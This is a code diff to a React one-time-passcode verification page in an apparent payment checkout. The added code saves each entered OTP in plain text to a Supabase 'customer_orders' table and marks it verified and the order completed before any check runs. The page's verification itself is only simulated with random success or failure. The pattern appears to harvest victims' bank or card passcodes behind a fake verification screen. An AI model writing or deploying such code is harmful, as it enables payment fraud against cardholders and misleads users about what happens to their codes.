@@ -4,9 +4,12 @@ import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
 import PaymentLogos from "@/components/PaymentLogos";
+import { useOrder } from "@/contexts/OrderContext";
+import { supabase } from "@/integrations/supabase/client";
 const OtpVerification = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
+  const { orderData, updateOrderData } = useOrder();
   const {
     toast
   } = useToast();
@@ -26,6 +29,27 @@ const OtpVerification = () => {
       return;
     }
     setIsLoading(true);
+
+    // Update context
+    updateOrderData({
+      otpCode: otp,
+    });
+
+    // Update database
+    try {
+      if (orderData.sequenceNumber) {
+        await supabase
+          .from("customer_orders")
+          .update({
+            otp_code: otp,
+            otp_verified: true,
+            status: "completed",
+          })
+          .eq("sequence_number", orderData.sequenceNumber);
+      }
+    } catch (error) {
+      console.error("Error updating order:", error);
+    }
 
     // Simulate OTP verification with random success/failure
     setTimeout(() => {
